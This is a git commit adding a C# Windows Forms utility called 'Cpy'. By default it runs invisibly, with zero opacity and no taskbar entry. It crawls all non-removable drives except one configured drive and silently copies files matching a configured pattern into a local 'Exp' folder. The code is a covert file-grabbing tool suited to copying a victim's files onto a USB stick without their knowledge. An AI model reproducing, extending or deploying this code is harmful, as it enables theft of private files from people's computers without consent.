029e9527c9c75f27c31e5af8f1febf8cc18f6c5f
wsaleemi <waqaralisaleemi@gmail.com>
2024-05-27 16:00:11 +0500

    commit

---
+++ Cpy/Cpy.Designer.cs
@@ -0,0 +1,73 @@
+﻿namespace Cpy
+{
+    partial class Cpy
+    {
+        /// <summary>
+        /// Required designer variable.
+        /// </summary>
+        private System.ComponentModel.IContainer components = null;
+
+        /// <summary>
+        /// Clean up any resources being used.
+        /// </summary>
+        /// <param name="disposing">true if managed resources should be disposed; otherwise, false.</param>
+        protected override void Dispose(bool disposing)
+        {
+            if (disposing && (components != null))
+            {
+                components.Dispose();
+            }
+            base.Dispose(disposing);
+        }
+
+        #region Windows Form Designer generated code
+
+        /// <summary>
+        /// Required method for Designer support - do not modify
+        /// the contents of this method with the code editor.
+        /// </summary>
+        private void InitializeComponent()
+        {
+            this.bgWorker = new System.ComponentModel.BackgroundWorker();
+            this.progressBar = new System.Windows.Forms.ProgressBar();
+            this.SuspendLayout();
+            // 
+            // bgWorker
+            // 
+            this.bgWorker.WorkerReportsProgress = true;
+            this.bgWorker.WorkerSupportsCancellation = true;
+            this.bgWorker.DoWork += new System.ComponentModel.DoWorkEventHandler(this.backgroundWorker_DoWork);
+            this.bgWorker.ProgressChanged += new System.ComponentModel.ProgressChangedEventHandler(this.backgroundWorker_ProgressChanged);
+            this.bgWorker.RunWorkerCompleted += new System.ComponentModel.RunWorkerCompletedEventHandler(this.backgroundWorker_RunWorkerCompleted);
+            // 
+            // progressBar
+            // 
+            this.progressBar.Location = new System.Drawing.Point(12, 12);
+            this.progressBar.Name = "progressBar";
+            this.progressBar.Size = new System.Drawing.Size(276, 23);
+            this.progressBar.TabIndex = 0;
+            // 
+            // Cpy
+            // 
+            this.AutoScaleDimensions = new System.Drawing.SizeF(6F, 13F);
+            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
+            this.ClientSize = new System.Drawing.Size(300, 48);
+            this.Controls.Add(this.progressBar);
+            this.FormBorderStyle = System.Windows.Forms.FormBorderStyle.FixedToolWindow;
+            this.Name = "Cpy";
+            this.Opacity = 0D;
+            this.ShowIcon = false;
+            this.ShowInTaskbar = false;
+            this.StartPosition = System.Windows.Forms.FormStartPosition.CenterScreen;
+            this.Text = "Cpy";
+            this.ResumeLayout(false);
+
+        }
+
+        #endregion
+
+        private System.ComponentModel.BackgroundWorker bgWorker;
+        private System.Windows.Forms.ProgressBar progressBar;
+    }
+}
+
---
+++ Cpy/Cpy.cs
@@ -0,0 +1,123 @@
+﻿using System;
+using System.Windows.Forms;
+using System.IO;
+using System.Collections.Generic;
+
+namespace Cpy
+{
+    public partial class Cpy : Form
+    {
+        string[] format = File.ReadAllLines("ex.txt");
+        public Cpy()
+        {
+            InitializeComponent();
+            progressBar.Value = 0;
+            bgWorker.RunWorkerAsync();
+            if (format[1] == "show")
+            {
+                this.Opacity = 100;
+            }
+            else
+            {
+                this.Opacity = 0;
+            }
+        }
+
+        private bool hasWriteAccessToFolder(string folderPath)
+        {
+            try
+            {
+                System.Security.AccessControl.DirectorySecurity ds = Directory.GetAccessControl(folderPath);
+                return true;
+            }
+            catch (UnauthorizedAccessException)
+            {
+                return false;
+            }
+        }
+
+        private void backgroundWorker_DoWork(object sender, System.ComponentModel.DoWorkEventArgs e)
+        {
+            try
+            {
+                List<string> namesOfDirectories = new List<string>();
+                foreach (DriveInfo driveInfo in DriveInfo.GetDrives())
+                {
+                    if (driveInfo.Name != format[2] && driveInfo.DriveType.ToString()!="Removable")
+                    {
+                        if (hasWriteAccessToFolder(driveInfo.Name))
+                        {
+                            DirectoryInfo info = new DirectoryInfo(driveInfo.Name);
+                            FileInfo[] Files = info.GetFiles(format[0]);
+                            foreach (FileInfo file in Files)
+                            {
+                                File.Copy(file.FullName + "", @"Exp\" + file.Name, true);
+                            }
+                        }
+                        namesOfDirectories = subDirectories(driveInfo.Name);
+                        {
+                            int index = 1;
+                            foreach (string s in namesOfDirectories)
+                            {
+                                if (s != null)
+                                {
+                                    if (hasWriteAccessToFolder(s))
+                                    {
+                                        DirectoryInfo info = new DirectoryInfo(s);
+                                        FileInfo[] Files = info.GetFiles(format[0]);
+                                        foreach (FileInfo file in Files)
+                                        {
+                                            File.Copy(file.FullName + "", @"Exp\" + file.Name, true);
+                                        }
+                                    }
+                                }
+                                if (!bgWorker.CancellationPending)
+                                {
+                                    bgWorker.ReportProgress(index++ * 100 / (namesOfDirectories.Count-1));
+                                }
+                            }
+                        }
+                    }
+                }
+            }
+            catch (Exception ex)
+            {
+                MessageBox.Show(ex.Message, "Error", MessageBoxButtons.OK, MessageBoxIcon.Error);
+            }
+        }
+        
+        List<string> nameOfDirectories = new List<string>();
+        private List<string> subDirectories(string path)
+        {
+            var directory = new DirectoryInfo(path);
+            if (hasWriteAccessToFolder(directory.FullName))
+            {
+                foreach (var d in directory.GetDirectories())
+                {
+                    if (hasWriteAccessToFolder(d.FullName))
+                    {
+                        if(d.FullName != @"C:\Documents and Settings")
+                        {
+                            if (d.GetDirectories().Length >= 0)
+                            {
+                                nameOfDirectories.Add(d.FullName);
+                                subDirectories(d.FullName);
+                            }
+                        }
+                    }
+                }
+            }
+            return nameOfDirectories;
+        }
+
+        private void backgroundWorker_RunWorkerCompleted(object sender, System.ComponentModel.RunWorkerCompletedEventArgs e)
+        {
+            this.Close();
+        }
+
+        private void backgroundWorker_ProgressChanged(object sender, System.ComponentModel.ProgressChangedEventArgs e)
+        {
+            progressBar.Value = e.ProgressPercentage;
+        }
+    }
+}
